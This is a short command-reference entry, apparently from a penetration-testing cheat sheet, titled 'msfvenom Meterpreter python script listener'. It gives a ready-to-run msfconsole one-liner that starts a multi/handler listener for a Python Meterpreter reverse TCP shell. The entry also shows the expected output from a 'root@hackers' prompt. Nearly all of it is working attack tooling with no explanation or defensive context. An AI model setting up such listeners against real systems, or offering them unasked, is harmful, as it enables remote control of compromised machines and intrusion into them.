---
id: cf00f00b-8e7a-47d9-b138-aa68ffdccbf0
name: msfvenom Meterpreter python script listener
type: command
executor: null
data: msfconsole -q -x "use exploit/multi/handler;set PAYLOAD python/meterpreter/reverse_tcp;
  set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
output: 'root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD python/meterpreter/reverse_tcp;
  set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"

  [-] ***

  [-] * WARNING: No database support: No database YAML file

  [-] ***

  PAYLOAD => python/meterpreter/reverse_tcp

  LHOST => 172.16.162.187

  LPORT => 1337

  [*] Started reverse TCP handler on 172.16.162.187:1337'
created_at: '2019-09-17T16:46:08.383996+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# msfvenom Meterpreter python script listener

```bash
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
```

## Expected Output

```
root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD python/meterpreter/reverse_tcp; set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
PAYLOAD => python/meterpreter/reverse_tcp
LHOST => 172.16.162.187
LPORT => 1337
[*] Started reverse TCP handler on 172.16.162.187:1337
```
